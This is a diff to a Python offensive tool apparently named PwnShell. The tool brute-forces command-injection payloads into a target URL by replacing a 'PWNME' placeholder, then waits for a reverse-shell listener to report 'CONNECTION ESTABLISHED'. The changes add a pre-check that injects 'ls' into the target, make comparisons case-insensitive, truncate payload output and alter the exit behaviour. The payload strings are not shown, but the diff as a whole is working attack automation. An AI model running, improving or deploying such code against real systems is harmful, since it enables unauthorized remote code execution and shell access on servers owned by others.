@@ -40,7 +40,10 @@ class PwnShell:
 		self.encoded_payload=None
 		self.payload=None
 		self.connected = False
-
+		check = self.check_connection()
+		if not check:
+			print('Connection refused')
+			exit()
 		if not self.file and not self.domain:
 			print(colors.get_colored_text("[!]Please use Provide a URL or a REQUEST file[!]\n\n"+"[!]USAGE: "+sys.argv[0]+" -h\n", ColorsSet.RED))
 			exit()
@@ -114,11 +117,11 @@ class PwnShell:
 
 	def for_listener(self):
 		print("[*]CONNECTION ESTABLISHED!")
-		if self.method == "get" or self.method == "GET":
+		if self.method.lower() == "get":
 			print("[+]Vulnerable URL:",self.url)
 			print("[+]Payload:",self.payload)
 		else:
-			if self.payload_type == "encoded" or self.payload_type == 'ENCODED':
+			if self.payload_type.lower() == "encoded":
 				print(f"[+]Payload: {self.encoded_payload}")
 			else:
 				print(f"[+]Payload: {self.payload}")
@@ -162,7 +165,6 @@ class PwnShell:
 		sendpayload.join()
 		if self.file:
 			burp.join()
-
 	############################################################################################
 	################################ Check If we got connection ################################
 	def is_port_in_use(self):
@@ -176,7 +178,6 @@ class PwnShell:
 	############################################################################################
 	###################################  SENDING THE PAYLOADS #################################
 	def send_payload(self):
-		
 		if not self.file:
 			payloads = PayLoads(self.ip, self.port,self.nodejs).payloads()
 			print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
@@ -186,17 +187,17 @@ class PwnShell:
 				self.payload=payload
 				self.encoded_payload = self.get_url_encoded_payload(payload)
 				self.iteration += 1
-				print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {payload}',end='\r',flush=True)
+				print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {payload[:80]}...',end='\r',flush=True)
 				time.sleep(2)
 				if self.is_port_in_use():
 					break
 				self.send_request(payload)
-
+			exit_gracefully()
 	###############################################################################################
 	###################################  Send The Request #########################################
 	def send_request(self,payload):
 		if self.domain:
-			if self.payload_type == "encoded" or self.payload_type == "ENCODED":
+			if self.payload_type.lower() == "encoded":
 				self.url = self.domain.replace('PWNME',self.encoded_payload)
 			else:
 				self.url = self.domain.replace('PWNME',payload)
@@ -283,10 +284,19 @@ class PwnShell:
 		encoded_payload = encoded_payload.replace('/', '%2F')
 		return encoded_payload
 
+	def check_connection(self):
+		url = self.domain.replace('PWNME', 'ls')
+		try:
+			req = requests.get(url)
+			return True
+		except requests.exceptions.ConnectionError:
+			return False
+
+		
 
 def exit_gracefully():
 	print("								   #GOOD BYE!")
-	exit()
+	os._exit(1)
 
 
 if __name__ == '__main__':
